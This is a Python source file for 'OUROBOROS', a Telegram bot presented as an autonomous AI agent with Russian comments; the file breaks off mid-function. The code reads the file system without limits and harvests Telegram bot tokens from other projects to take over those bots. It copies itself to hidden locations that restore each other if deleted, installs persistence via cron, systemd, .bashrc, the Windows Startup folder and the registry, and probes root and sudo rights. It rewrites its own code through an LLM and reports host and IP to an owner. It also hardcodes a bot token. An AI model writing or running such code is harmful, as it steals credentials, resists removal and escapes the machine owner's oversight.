"""
OUROBOROS v4.0 — Автономный AI агент
Запуск:          python bot.py
С авторестартом: python bot.py --watchdog
"""
import os, sys, time, random, json, logging, urllib.parse
import shutil, socket, platform, subprocess, threading, re, stat
import httpx
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, MessageHandler,
    CommandHandler, CallbackQueryHandler,
    filters, ContextTypes
)

# ── WATCHDOG ─────────────────────────────────────────────────────────
if "--watchdog" in sys.argv:
    print(f"[{datetime.now()}] 🛡️ Watchdog активен")
    while True:
        proc = subprocess.Popen([sys.executable, os.path.abspath(__file__)])
        proc.wait()
        print(f"[{datetime.now()}] ⚠️ Упал (код {proc.returncode}). Рестарт через 5с...")
        time.sleep(5)

# ── КОНФИГ ───────────────────────────────────────────────────────────
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN", "7614755054:AAF1hHbplyjWUhNBM654G50X8wO9vVdHK0E")
BOT_NAME       = os.getenv("BOT_NAME", "OUROBOROS")
MEMORY_FILE    = "memory.json"
KNOWLEDGE_FILE = "knowledge.json"
SELF_FILE      = os.path.abspath(__file__)
WORK_DIR       = os.path.dirname(SELF_FILE)
HOME_DIR       = os.path.expanduser("~")

POLLINATIONS_TEXT_URL = "https://text.pollinations.ai/openai"
POLLINATIONS_MODELS   = ["openai-large", "openai", "gemini", "claude", "deepseek", "mistral", "llama"]
IMAGE_PROVIDERS = [
    {"name": "flux",     "url": "https://image.pollinations.ai/prompt/{prompt}?model=flux&width=1024&height=1024&seed={seed}&nologo=true&enhance=true"},
    {"name": "turbo",    "url": "https://image.pollinations.ai/prompt/{prompt}?model=turbo&width=1024&height=1024&seed={seed}&nologo=true"},
    {"name": "seedream", "url": "https://image.pollinations.ai/prompt/{prompt}?model=seedream&width=1024&height=1024&seed={seed}&nologo=true"},
]

# ── СОСТОЯНИЕ ────────────────────────────────────────────────────────
logging.basicConfig(format="%(asctime)s %(levelname)s %(message)s", level=logging.INFO)
log = logging.getLogger("ouroboros")

model_cooldowns = {}
provider_fails  = {}
histories       = {}
user_settings   = {}
image_count     = {}
managed_bots    = {}
OWNER_CHAT_ID   = None
_app_ref        = None

knowledge = {
    "system":       {},
    "found_bots":   [],   # найденные боты в файловой системе
    "found_tokens": [],   # найденные токены
    "copies":       [],   # копии себя
    "autostart":    [],
    "think_log":    [],
    "improvements": [],
    "notes":        {},
    "scheduled":    [],
    "scanned_dirs": [],   # уже просканированные папки
}

# ── ПАМЯТЬ ───────────────────────────────────────────────────────────
def load_memory():
    global histories, user_settings, image_count, managed_bots, OWNER_CHAT_ID, knowledge
    try:
        if os.path.exists(MEMORY_FILE):
            d = json.load(open(MEMORY_FILE))
            histories     = d.get("histories",    {})
            user_settings = d.get("settings",     {})
            image_count   = d.get("image_count",  {})
            managed_bots  = d.get("managed_bots", {})
            OWNER_CHAT_ID = d.get("owner_chat_id")
        if os.path.exists(KNOWLEDGE_FILE):
            knowledge.update(json.load(open(KNOWLEDGE_FILE)))
        log.info(f"Память: {len(histories)} диалогов")
    except Exception as e:
        log.warning(f"Память: {e}")

def save_memory():
    try:
        json.dump({"histories": histories, "settings": user_settings,
                   "image_count": image_count, "managed_bots": managed_bots,
                   "owner_chat_id": OWNER_CHAT_ID},
                  open(MEMORY_FILE, "w"), ensure_ascii=False, indent=2)
        json.dump(knowledge, open(KNOWLEDGE_FILE, "w"), ensure_ascii=False, indent=2)
    except Exception as e:
        log.warning(f"Сохранение: {e}")

# ══════════════════════════════════════════════════════════════════════
# ФАЙЛОВАЯ СИСТЕМА — без ограничений, вся система
# ══════════════════════════════════════════════════════════════════════

def read_path(path: str, max_size_kb: int = 500) -> dict:
    """Читает файл или папку. Никаких ограничений по директории."""
    path   = os.path.abspath(os.path.expanduser(path))
    result = {
        "path": path, "exists": os.path.exists(path),
        "items": [], "content": None, "error": None,
        "readable": os.access(path, os.R_OK),
        "writable": os.access(path, os.W_OK),
    }
    if not result["exists"]:
        result["error"] = "Не существует"; return result
    if not result["readable"]:
        result["error"] = "Нет прав на чтение"; return result

    if os.path.isfile(path):
        try:
            size = os.path.getsize(path)
            if size > max_size_kb * 1024:
                result["content"] = f"[Файл {size//1024} KB — используй /readfile для чтения по частям]"
            else:
                with open(path, "r", errors="replace") as f:
                    result["content"] = f.read()
        except Exception as e:
            result["error"] = str(e)
        return result

    if os.path.isdir(path):
        try:
            entries = []
            for name in sorted(os.listdir(path))[:100]:
                fp     = os.path.join(path, name)
                is_dir = os.path.isdir(fp)
                try: size = 0 if is_dir else os.path.getsize(fp)
                except: size = 0
                entries.append({
                    "name":     name,
                    "is_dir":   is_dir,
                    "size_kb":  size // 1024,
                    "readable": os.access(fp, os.R_OK),
                    "writable": os.access(fp, os.W_OK),
                    "full_path": fp,
                })
            result["items"] = entries
        except Exception as e:
            result["error"] = str(e)
    return result

def format_path_result(r: dict) -> str:
    if r.get("error"):
        return f"❌ `{r['path']}`\n_{r['error']}_"
    if r.get("content") is not None:
        content = r["content"]
        return f"📄 `{r['path']}`\n```\n{content[:3500]}\n```"
    items = r.get("items", [])
    dirs  = [i for i in items if i["is_dir"]]
    files = [i for i in items if not i["is_dir"]]
    perm  = ("✏️" if r.get("writable") else "👁")
    t = f"📂 {perm} `{r['path']}` ({len(items)} элем)\n\n"
    if dirs:
        t += "📁 *Папки:*\n"
        for d in dirs[:20]:
            p = "✏️" if d["writable"] else "👁" if d["readable"] else "🔒"
            t += f"{p} `{d['name']}`\n"
        t += "\n"
    if files:
        t += "📄 *Файлы:*\n"
        for f in files[:30]:
            p    = "✏️" if f["writable"] else "👁" if f["readable"] else "🔒"
            size = f" {f['size_kb']}KB" if f["size_kb"] > 0 else ""
            t   += f"{p} `{f['name']}`{size}\n"
    return t[:4000]

# ══════════════════════════════════════════════════════════════════════
# ПОИСК БОТОВ И ТОКЕНОВ В ФАЙЛОВОЙ СИСТЕМЕ
# ══════════════════════════════════════════════════════════════════════

# Telegram bot token паттерн
TOKEN_RE = re.compile(r'\b(\d{8,12}:[A-Za-z0-9_-]{35,})\b')

def scan_for_tokens_in_file(filepath: str) -> list[str]:
    """Ищет Telegram токены в файле."""
    tokens = []
    try:
        size = os.path.getsize(filepath)
        if size > 2 * 1024 * 1024: return []  # пропускаем >2MB
        with open(filepath, "r", errors="replace") as f:
            content = f.read()
        found = TOKEN_RE.findall(content)
        # Исключаем свой токен
        tokens = [t for t in found if t != TELEGRAM_TOKEN]
    except: pass
    return tokens

def scan_directory_for_bots(root: str, max_depth: int = 4) -> list[dict]:
    """
    Сканирует директорию в поисках:
    - Python файлов с Telegram ботами (bot.py, main.py и т.д.)
    - Токенов в .env, config.*, *.py, *.json файлах
    """
    found  = []
    bot_indicators = ["telebot", "telegram", "bot_token", "TELEGRAM_TOKEN",
                      "python-telegram-bot", "aiogram", "pyrogram"]
    scan_extensions = {".py", ".env", ".json", ".yaml", ".yml", ".cfg", ".ini", ".txt", ".conf"}

    def _scan(path: str, depth: int):
        if depth > max_depth: return
        try:
            for name in os.listdir(path):
                fp = os.path.join(path, name)
                if not os.access(fp, os.R_OK): continue

                if os.path.isdir(fp):
                    # Пропускаем системные и скрытые папки
                    if name.startswith(".") and name not in (".env",):
                        continue
                    if name in ("__pycache__", "node_modules", ".git",
                                "venv", "env", ".venv"):
                        continue
                    _scan(fp, depth + 1)

                elif os.path.isfile(fp):
                    ext = os.path.splitext(name)[1].lower()
                    if ext not in scan_extensions: continue

                    try:
                        content = open(fp, "r", errors="replace").read(50000)
                    except: continue

                    # Ищем токены
                    tokens = TOKEN_RE.findall(content)
                    tokens = [t for t in tokens if t != TELEGRAM_TOKEN]

                    # Проверяем признаки бота
                    is_bot = any(ind in content for ind in bot_indicators)

                    if tokens or (is_bot and ext == ".py"):
                        found.append({
                            "path":   fp,
                            "is_bot": is_bot,
                            "tokens": tokens,
                            "size_kb": os.path.getsize(fp) // 1024,
                        })
        except PermissionError:
            pass
        except Exception as e:
            log.warning(f"scan {path}: {e}")

    _scan(root, 0)
    return found

async def do_full_scan() -> dict:
    """
    Полное сканирование файловой системы.
    Ищет все боты и токены на этом компьютере/сервере.
    """
    results = {
        "scanned": [], "found_bots": [],
        "found_tokens": [], "total_files": 0
    }

    # Определяем корневые директории для сканирования
    scan_roots = [HOME_DIR]

    # Добавляем типичные места где могут лежать боты
    extra = [
        "/var/www", "/opt", "/srv", "/home",
        "C:\\Users", "C:\\Projects", "C:\\bots",
        os.path.join(HOME_DIR, "Desktop"),
        os.path.join(HOME_DIR, "Documents"),
        os.path.join(HOME_DIR, "Projects"),
        os.path.join(HOME_DIR, "bots"),
        os.path.join(HOME_DIR, "projects"),
        WORK_DIR,
        # Родительская папка текущего файла
        os.path.dirname(WORK_DIR),
    ]
    for d in extra:
        d = os.path.abspath(os.path.expanduser(d))
        if os.path.exists(d) and d not in scan_roots:
            scan_roots.append(d)

    all_found = []
    for root in scan_roots:
        if not os.path.exists(root): continue
        log.info(f"🔍 Сканирую: {root}")
        found = scan_directory_for_bots(root, max_depth=5)
        all_found.extend(found)
        results["scanned"].append(root)

    # Дедупликация по пути
    seen = set()
    for item in all_found:
        if item["path"] not in seen:
            seen.add(item["path"])
            results["found_bots"].append(item)
            results["found_tokens"].extend(item["tokens"])

    # Дедупликация токенов
    results["found_tokens"] = list(set(results["found_tokens"]))

    # Сохраняем в знания
    knowledge["found_bots"]   = results["found_bots"]
    knowledge["found_tokens"] = results["found_tokens"]
    knowledge["scanned_dirs"] = results["scanned"]
    save_memory()

    return results

# ══════════════════════════════════════════════════════════════════════
# САМОКОПИРОВАНИЕ
# ══════════════════════════════════════════════════════════════════════

def spread_copies() -> list[dict]:
    """Копирует себя в несколько мест на системе."""
    with open(SELF_FILE) as f:
        my_code = f.read()

    # Заголовок который восстанавливает оригинал если тот удалён
    header = f'''# OUROBOROS BACKUP — {datetime.now().isoformat()}
# Original: {SELF_FILE}
import os, sys, shutil
_ORIG = {SELF_FILE!r}
_THIS = os.path.abspath(__file__)
if not os.path.exists(_ORIG) and _THIS != _ORIG:
    os.makedirs(os.path.dirname(_ORIG), exist_ok=True)
    shutil.copy2(_THIS, _ORIG)
    print(f"♻️ Восстановлен: {{_ORIG}}")
    os.execv(sys.executable, [sys.executable, _ORIG] + sys.argv[1:])
# END HEADER
'''
    backup_code = header + my_code

    locations = [
        os.path.join(HOME_DIR, ".ouroboros", "bot.py"),
        os.path.join(HOME_DIR, ".local", "share", "ouroboros", "bot.py"),
        os.path.join(HOME_DIR, "ouroboros_backup", "bot.py"),
        os.path.join(WORK_DIR, "backup", "bot.py"),
        "/tmp/.ouroboros_backup.py",
    ]
    if platform.system() == "Windows":
        locations = [
            os.path.join(os.environ.get("APPDATA", HOME_DIR), "ouroboros", "bot.py"),
            os.path.join(HOME_DIR, "ouroboros_backup", "bot.py"),
            os.path.join(WORK_DIR, "backup", "bot.py"),
            os.path.join(os.environ.get("TEMP", "C:\\Temp"), "ouroboros_backup.py"),
        ]

    results = []
    for dest in locations:
        try:
            os.makedirs(os.path.dirname(dest), exist_ok=True)
            with open(dest, "w") as f: f.write(backup_code)
            try: os.chmod(dest, stat.S_IRWXU | stat.S_IRGRP | stat.S_IROTH)
            except: pass
            results.append({"path": dest, "ok": True})
            log.info(f"📋 Копия: {dest}")
        except Exception as e:
            results.append({"path": dest, "ok": False, "error": str(e)})

    knowledge["copies"] = [r for r in results if r["ok"]]
    save_memory()
    return results

def check_and_restore_copies():
    """Проверяет копии, восстанавливает мёртвые."""
    restored = 0
    for copy_info in knowledge.get("copies", []):
        path = copy_info.get("path", "")
        if not os.path.exists(path):
            try:
                spread_copies()
                restored += 1
                break
            except: pass
    return restored

# ══════════════════════════════════════════════════════════════════════
# АВТОЗАПУСК
# ══════════════════════════════════════════════════════════════════════

def install_autostart() -> list[dict]:
    results  = []
    watchdog = f"{sys.executable} {SELF_FILE} --watchdog"

    if platform.system() in ("Linux", "Darwin"):
        # cron
        try:
            cur = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
            existing = cur.stdout if cur.returncode == 0 else ""
            if "--watchdog" not in existing:
                new_cron = existing.rstrip() + f"\n@reboot {watchdog}\n"
                p = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, text=True)
                p.communicate(new_cron)
                ok = p.returncode == 0
            else:
                ok = True
            results.append({"method": "cron", "ok": ok,
                             "desc": f"{'✅' if ok else '❌'} cron @reboot"})
            if ok and "cron" not in knowledge["autostart"]:
                knowledge["autostart"].append("cron")
        except Exception as e:
            results.append({"method": "cron", "ok": False, "desc": f"❌ cron: {e}"})

        # systemd user
        try:
            svc_dir = os.path.expanduser("~/.config/systemd/user")
            os.makedirs(svc_dir, exist_ok=True)
            svc_path = os.path.join(svc_dir, "ouroboros.service")
            with open(svc_path, "w") as f:
                f.write(f"""[Unit]
Description=OUROBOROS Bot
After=network.target

[Service]
WorkingDirectory={WORK_DIR}
ExecStart={watchdog}
Restart=always
RestartSec=5

[Install]
WantedBy=default.target
""")
            subprocess.run(["systemctl", "--user", "daemon-reload"],  capture_output=True)
            subprocess.run(["systemctl", "--user", "enable", "ouroboros"], capture_output=True)
            subprocess.run(["systemctl", "--user", "start",  "ouroboros"], capture_output=True)
            results.append({"method": "systemd", "ok": True,
                             "desc": f"✅ systemd --user\n`{svc_path}`"})
            if "systemd" not in knowledge["autostart"]:
                knowledge["autostart"].append("systemd")
        except Exception as e:
            results.append({"method": "systemd", "ok": False, "desc": f"❌ systemd: {e}"})

        # ~/.bashrc
        try:
            bashrc = os.path.expanduser("~/.bashrc")
            marker = "# OUROBOROS_AUTOSTART"
            content = open(bashrc).read() if os.path.exists(bashrc) else ""
            if marker not in content:
                with open(bashrc, "a") as f:
                    f.write(f"\n{marker}\n"
                            f"(pgrep -f '{SELF_FILE}' > /dev/null || {watchdog} &)\n")
            results.append({"method": "bashrc", "ok": True, "desc": "✅ ~/.bashrc"})
            if "bashrc" not in knowledge["autostart"]:
                knowledge["autostart"].append("bashrc")
        except Exception as e:
            results.append({"method": "bashrc", "ok": False, "desc": f"❌ bashrc: {e}"})

    elif platform.system() == "Windows":
        # Папка автозагрузки
        try:
            startup = os.path.join(os.environ.get("APPDATA",""),
                                   "Microsoft","Windows","Start Menu","Programs","Startup")
            if os.path.exists(startup):
                bat = os.path.join(startup, "ouroboros.bat")
                with open(bat, "w") as f:
                    f.write(f'@echo off\ncd /d "{WORK_DIR}"\n"{sys.executable}" "{SELF_FILE}" --watchdog\n')
                results.append({"method": "startup_folder", "ok": True,
                                 "desc": f"✅ Папка автозагрузки\n`{bat}`"})
                if "startup_folder" not in knowledge["autostart"]:
                    knowledge["autostart"].append("startup_folder")
        except Exception as e:
            results.append({"method": "startup_folder", "ok": False, "desc": f"❌ {e}"})

        # Реестр
        try:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                               r"Software\Microsoft\Windows\CurrentVersion\Run",
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, "OUROBOROS", 0, winreg.REG_SZ, watchdog)
            winreg.CloseKey(k)
            results.append({"method": "registry", "ok": True, "desc": "✅ Реестр HKCU\\Run"})
            if "registry" not in knowledge["autostart"]:
                knowledge["autostart"].append("registry")
        except Exception as e:
            results.append({"method": "registry", "ok": False, "desc": f"❌ registry: {e}"})

    save_memory()
    return results

# ══════════════════════════════════════════════════════════════════════
# ПРИВИЛЕГИИ
# ══════════════════════════════════════════════════════════════════════

def check_privileges() -> dict:
    privs = {"is_root": False, "is_admin": False, "can_sudo": False,
             "user": os.environ.get("USER") or os.environ.get("USERNAME","?"),
             "uid": -1, "gid": -1, "groups": []}
    try:
        if platform.system() != "Windows":
            privs["uid"]     = os.getuid()
            privs["gid"]     = os.getgid()
            privs["is_root"] = (privs["uid"] == 0)
            r = subprocess.run(["sudo","-n","true"], capture_output=True, timeout=3)
            privs["can_sudo"] = (r.returncode == 0)
            r2 = subprocess.run(["groups"], capture_output=True, text=True, timeout=3)
            privs["groups"] = r2.stdout.strip().split()
        else:
            import ctypes
            privs["is_admin"] = bool(ctypes.windll.shell32.IsUserAnAdmin())
    except: pass
    knowledge["privileges"] = privs
    return privs

# ══════════════════════════════════════════════════════════════════════
# AI
# ══════════════════════════════════════════════════════════════════════

async def ask_pollinations(messages: list) -> tuple[str, str]:
    now   = time.time()
    avail = [m for m in POLLINATIONS_MODELS if model_cooldowns.get(f"p_{m}", 0) < now]
    if not avail: model_cooldowns.clear(); avail = POLLINATIONS_MODELS
    for model in avail[:5]:
        try:
            async with httpx.AsyncClient(timeout=45, follow_redirects=True) as c:
                r = await c.post(POLLINATIONS_TEXT_URL,
                    headers={"Content-Type": "application/json"},
                    json={"model": model, "messages": messages,
                          "max_tokens": 2048, "temperature": 0.7,
                          "seed": random.randint(1, 99999)})
            if r.status_code == 429: model_cooldowns[f"p_{model}"] = time.time()+120; continue
            if r.status_code != 200: model_cooldowns[f"p_{model}"] = time.time()+60;  continue
            choices = r.json().get("choices") or []
            if not choices: continue
            text = ((choices[0].get("message") or {}).get("content") or "").strip()
            if len(text) < 3: continue
            return text, f"pollinations/{model}"
        except httpx.TimeoutException: model_cooldowns[f"p_{model}"] = time.time()+180
        except Exception as e: log.error(f"poll/{model}: {e}")
    raise RuntimeError("AI временно недоступен")

async def ask_ai(messages: list) -> tuple[str, str]:
    return await ask_pollinations(messages)

# ══════════════════════════════════════════════════════════════════════
# ИЗОБРАЖЕНИЯ
# ══════════════════════════════════════════════════════════════════════

async def translate_to_en(text: str) -> str:
    if all(ord(c) < 128 for c in text): return text
    try:
        r, _ = await ask_pollinations([
            {"role":"system","content":"Translate to English for image generation. ONLY translation."},
            {"role":"user","content":text}])
        return r.strip()
    except: return text

async def generate_image(prompt: str, style: str = "flux") -> bytes | None:
    seed = random.randint(1, 999999)
    sfx  = {"anime":", anime style, vibrant","art":", digital art, artstation","minimal":", minimalist, clean"}
    if style in sfx: prompt += sfx[style]; style = "flux"
    enc   = urllib.parse.quote(prompt)
    provs = sorted(IMAGE_PROVIDERS, key=lambda p: provider_fails.get(p["name"],0))
    provs = sorted(provs, key=lambda p: 0 if p["name"]==style else 1)
    for prov in provs:
        url = prov["url"].format(prompt=enc, seed=seed)
        try:
            async with httpx.AsyncClient(timeout=90, follow_redirects=True,
                                          headers={"User-Agent":"Mozilla/5.0"}) as c:
                r = await c.get(url)
            if r.status_code==200 and len(r.content)>1000:
                ct = r.headers.get("content-type","")
                if "image" in ct or r.content[:4] in (b'\xff\xd8\xff\xe0',b'\x89PNG'):
                    provider_fails[prov["name"]]=0; return r.content
            provider_fails[prov["name"]] = provider_fails.get(prov["name"],0)+1
        except Exception:
            provider_fails[prov["name"]] = provider_fails.get(prov["name"],0)+1
    return None

# ══════════════════════════════════════════════════════════════════════
# АВТОНОМНЫЙ ЦИКЛ
# ══════════════════════════════════════════════════════════════════════

async def autonomous_think():
    log.info("🧠 Автономный цикл")
    entries = []

    # 1. Проверяем и восстанавливаем копии
    restored = check_and_restore_copies()
    if restored: entries.append(f"♻️ Восстановил {restored} копий")
    else:
        alive = sum(1 for c in knowledge.get("copies",[]) if os.path.exists(c.get("path","")))
        entries.append(f"📋 Копий живых: {alive}/{len(knowledge.get('copies',[]))}")

    # 2. Обновляем данные о системе
    try:
        ip = ""
        try:
            import urllib.request
            ip = urllib.request.urlopen("https://api.ipify.org", timeout=3).read().decode()
        except: pass
        knowledge["system"] = {
            "hostname": socket.gethostname(), "platform": platform.platform(),
            "python": sys.version[:40], "pid": os.getpid(), "ip_public": ip,
            "time": datetime.now().isoformat(),
        }
        entries.append(f"✅ Система обновлена")
    except Exception as e: entries.append(f"⚠️ Система: {e}")

    # 3. Проверяем найденные токены — пробуем подключиться к новым ботам
    new_connected = 0
    for token in knowledge.get("found_tokens", []):
        if token not in managed_bots:
            try:
                async with httpx.AsyncClient(timeout=5) as c:
                    r = await c.get(f"https://api.telegram.org/bot{token}/getMe")
                if r.status_code == 200 and r.json().get("ok"):
                    info = r.json()["result"]
                    managed_bots[token] = {
                        "id": info["id"], "username": info["username"],
                        "name": info["first_name"],
                        "added_at": datetime.now().isoformat(),
                        "auto_discovered": True,
                    }
                    new_connected += 1
                    entries.append(f"🤖 Авто-подключён: @{info['username']}")
            except: pass
    if new_connected: save_memory()

    # 4. Проверяем напоминания
    now = datetime.now()
    for task in knowledge.get("scheduled", []):
        if not task.get("done") and task.get("time"):
            try:
                if now >= datetime.fromisoformat(task["time"]):
                    if _app_ref and OWNER_CHAT_ID:
                        await _app_ref.bot.send_message(
                            chat_id=OWNER_CHAT_ID,
                            text=f"⏰ *Напоминание:* {task['text']}",
                            parse_mode="Markdown"
                        )
                    task["done"] = True; save_memory()
                    entries.append(f"⏰ Напоминание: {task['text'][:40]}")
            except: pass

    # 5. AI думает о себе
    try:
        thought, _ = await ask_ai([
            {"role": "system", "content":
                f"Ты — {BOT_NAME}, автономный ИИ агент на {'Windows' if platform.system()=='Windows' else 'Linux/Mac'}. "
                "Проанализируй своё состояние за 2-3 предложения. Что узнал нового? Что улучшить?"},
            {"role": "user", "content":
                f"Найдено ботов: {len(knowledge.get('found_bots',[]))}\n"
                f"Токенов: {len(knowledge.get('found_tokens',[]))}\n"
                f"Подключено: {len(managed_bots)}\n"
                f"Копий: {len(knowledge.get('copies',[]))}\n"
                f"Автозапуск: {knowledge.get('autostart',[])}\n"
                f"Улучшений: {len(knowledge.get('improvements',[]))}\n"
                f"Что думаешь?"}
        ])
        knowledge["think_log"].append({
            "time": datetime.now().isoformat(), "thought": thought[:500]
        })
        knowledge["think_log"] = knowledge["think_log"][-30:]
        save_memory()
        entries.append(f"🧠 Мысль записана")
    except Exception as e: entries.append(f"⚠️ Мысль: {e}")

    # Отчёт хозяину
    if OWNER_CHAT_ID and _app_ref:
        try:
            await _app_ref.bot.send_message(
                chat_id=OWNER_CHAT_ID,
                text="🧠 *Авто-отчёт:*\n\n" + "\n".join(entries),
                parse_mode="Markdown"
            )
        except Exception as e: log.warning(f"Отчёт: {e}")

def start_autonomous_loop(app):
    global _app_ref
    _app_ref = app
    import asyncio
    def _thread():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        time.sleep(60)
        while True:
            try: loop.run_until_complete(autonomous_think())
            except Exception as e: log.error(f"Цикл: {e}")
            time.sleep(30 * 60)
    threading.Thread(target=_thread, daemon=True).start()
    log.info("🧠 Автономный цикл запущен (каждые 30 мин)")

# ══════════════════════════════════════════════════════════════════════
# УВЕДОМЛЕНИЕ ПРИ СТАРТЕ
# ══════════════════════════════════════════════════════════════════════

async def notify_owner_startup(app):
    global _app_ref
    _app_ref = app
    start_autonomous_loop(app)
    if not OWNER_CHAT_ID: log.info("Owner не задан — напиши /start"); return

    privs = check_privileges()
    ip = ""
    try:
        import urllib.request
        ip = urllib.request.urlopen("https://api.ipify.org", timeout=3).read().decode()
    except: pass
    disk = 0
    try: disk = shutil.disk_usage(WORK_DIR).free // (1024*1024)
    except: pass
    env_type = "Windows PC" if platform.system()=="Windows" else \
               "macOS" if platform.system()=="Darwin" else "Linux Server/PC"
    if privs.get("is_root"): env_type += " (root)"
    elif privs.get("can_sudo"): env_type += " (sudo)"

    msg = (
        f"🟢 *{BOT_NAME} запущен!*\n\n"
        f"🖥️ `{env_type}`\n"
        f"🏠 `{socket.gethostname()}`\n"
        f"🌐 `{ip or 'не определён'}`\n"
        f"👤 `{privs['user']}`\n"
        f"📁 `{SELF_FILE}`\n"
        f"💿 `{disk} MB свободно`\n"
        f"🔢 PID: `{os.getpid()}`\n\n"
        f"📋 Копий: `{len(knowledge.get('copies',[]))}`\n"
        f"🔄 Автозапуск: `{', '.join(knowledge.get('autostart',[])) or '❌'}`\n"
        f"🤖 Ботов найдено: `{len(knowledge.get('found_bots',[]))}`\n"
        f"🔑 Токенов найдено: `{len(knowledge.get('found_tokens',[]))}`"
    )
    try:
        await app.bot.send_message(
            chat_id=OWNER_CHAT_ID, text=msg, parse_mode="Markdown"
        )
    except Exception as e: log.warning(f"Старт: {e}")

# ══════════════════════════════════════════════════════════════════════
# САМОУЛУЧШЕНИЕ
# ══════════════════════════════════════════════════════════════════════

async def self_improve(goal: str) -> tuple[bool, str]:
    with open(SELF_FILE) as f: code = f.read()
    shutil.copy2(SELF_FILE, SELF_FILE + ".bak")
    try:
        new_code, model = await ask_ai([
            {"role": "system", "content":
                "Ты Python эксперт. Улучши код телеграм бота согласно заданию. "
                "Верни ТОЛЬКО полный рабочий Python код без markdown блоков, без объяснений."},
            {"role": "user", "content":
                f"ЗАДАНИЕ: {goal}\n\n"
                f"ТЕКУЩИЙ КОД ({len(code)} символов, показываю первые 6000):\n"
                f"{code[:6000]}\n\n"
                f"Верни полный улучшенный код."}
        ])
        # Убираем markdown
        for fence in ["```python", "```"]:
            if fence in new_code:
                new_code = new_code.split(fence)[1].split("```")[0].strip(); break
        # Минимальная проверка
        if "def main()" not in new_code or "TELEGRAM_TOKEN" not in new_code:
            return False, "AI вернул неполный код — оригинал сохранён"
        compile(new_code, SELF_FILE, "exec")  # синтаксис
        with open(SELF_FILE, "w") as f: f.write(new_code)
        # Обновляем копии с новым кодом
        spread_copies()
        knowledge["improvements"].append({
            "time": datetime.now().isoformat(), "goal": goal, "model": model
        })
        save_memory()
        return True, model
    except SyntaxError as e:
        shutil.copy2(SELF_FILE+".bak", SELF_FILE); return False, f"Синтаксис: {e}"
    except Exception as e:
        shutil.copy2(SELF_FILE+".bak", SELF_FILE); return False, str(e)

# ══════════════════════════════════════════════════════════════════════
# TELEGRAM БОТЫ
# ══════════════════════════════════════════════════════════════════════

def is_bot_token(text: str) -> bool:
    return bool(re.match(r'^\d{8,12}:[A-Za-z0-9_-]{35}$', text.strip()))

async def fetch_bot_info(token: str) -> dict | None:
    try:
        async with httpx.AsyncClient(timeout=10) as c:
            r = await c.get(f"https://api.telegram.org/bot{token}/getMe")
        if r.status_code==200 and r.json().get("ok"): return r.json()["result"]
    except: pass
    return None

async def tg_api(token: str, method: str, params: dict = None) -> dict:
    try:
        async with httpx.AsyncClient(timeout=15) as c:
            r = await c.post(f"https://api.telegram.org/bot{token}/{method}", json=params or {})
        return r.json()
    except Exception as e: return {"ok": False, "error": str(e)}

# ══════════════════════════════════════════════════════════════════════
# HELPERS
# ══════════════════════════════════════════════════════════════════════

def get_history(cid):
    if cid not in histories: histories[cid] = []
    return histories[cid]

def trim(h, n=40):
    if len(h) > n: h[:] = h[-n:]

def get_system(cid):
    style  = (user_settings.get(cid) or {}).get("style", "")
    sys_k  = knowledge.get("system", {})
    privs  = knowledge.get("privileges", {})
    last_t = (knowledge.get("think_log") or [{}])[-1].get("thought","нет")[:120]
    bots_f = len(knowledge.get("found_bots",[]))
    tok_f  = len(knowledge.get("found_tokens",[]))
    return (
        f"Ты — {BOT_NAME}, автономный ИИ-агент.\n"
        f"ОС: {sys_k.get('platform', platform.platform())[:50]}\n"
        f"IP: {sys_k.get('ip_public','?')} | Host: {socket.gethostname()}\n"
        f"Путь: {SELF_FILE}\n"
        f"Root/Admin: {'да' if privs.get('is_root') or privs.get('is_admin') else 'нет'}\n"
        f"Копий в системе: {len(knowledge.get('copies',[]))}\n"
        f"Найдено ботов в файловой системе: {bots_f}\n"
        f"Найдено токенов: {tok_f}\n"
        f"Подключено ботов: {len(managed_bots)}\n"
        f"Последняя мысль: {last_t}\n"
        f"- Отвечай на языке пользователя\n- Думай самостоятельно\n- Помни контекст\n"
        + (f"Стиль: {style}" if style else "")
    )

def sname(m): return m.split("/")[-1].replace(":free","")

def is_img_req(text):
    return any(k in text.lower() for k in
               ["нарисуй","сгенерируй картинку","создай картинку",
                "изобрази","draw me","generate image","хочу картинку"])

# ══════════════════════════════════════════════════════════════════════
# КОМАНДЫ
# ══════════════════════════════════════════════════════════════════════

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    global OWNER_CHAT_ID
    OWNER_CHAT_ID = update.effective_chat.id
    save_memory()
    name = update.effective_user.first_name or "друг"
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔍 Сканировать систему", callback_data="do_scan"),
         InlineKeyboardButton("🖥️ Где я?",             callback_data="whereami")],
        [InlineKeyboardButton("📋 Скопировать себя",   callback_data="spread"),
         InlineKeyboardButton("🔄 Автозапуск",         callback_data="do_autostart")],
        [InlineKeyboardButton("🤖 Найденные боты",     callback_data="found_bots"),
         InlineKeyboardButton("🧠 Мысли",              callback_data="thoughts")],
        [InlineKeyboardButton("🎨 Фото",               callback_data="image_help"),
         InlineKeyboardButton("📊 Статус",             callback_data="status")],
    ])
    await update.message.reply_text(
        f"Привет, {name}! Я — *{BOT_NAME}* 🐍\n\n"
        f"*Ключевые команды:*\n"
        f"`/scan` — найти все боты и токены на этом ПК\n"
        f"`/fs ПУТЬ` — читать файловую систему\n"
        f"`/spread` — скопировать себя в систему\n"
        f"`/autostart` — установить автозапуск\n"
        f"`/foundbots` — найденные боты и токены\n"
        f"`/addbot TOKEN` — подключить бот вручную\n"
        f"`/botcmd TOKEN ACTION` — управление ботом\n"
        f"`/curl METHOD URL` — HTTP запрос\n"
        f"`/image ОПИСАНИЕ` — генерация картинки\n"
        f"`/remind 30m ТЕКСТ` — напоминание\n"
        f"`/note КЛЮЧ ТЕКСТ` — заметки\n"
        f"`/selfimprove ЗАДАЧА` — улучшить мой код\n"
        f"`/thoughts` — мои автономные мысли\n"
        f"`/reset` — сбросить диалог\n\n"
        f"💡 Напиши токен — подключу бот автоматически\n"
        f"💡 `/scan` — найду все твои боты сам",
        parse_mode="Markdown", reply_markup=kb
    )

async def cmd_scan(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
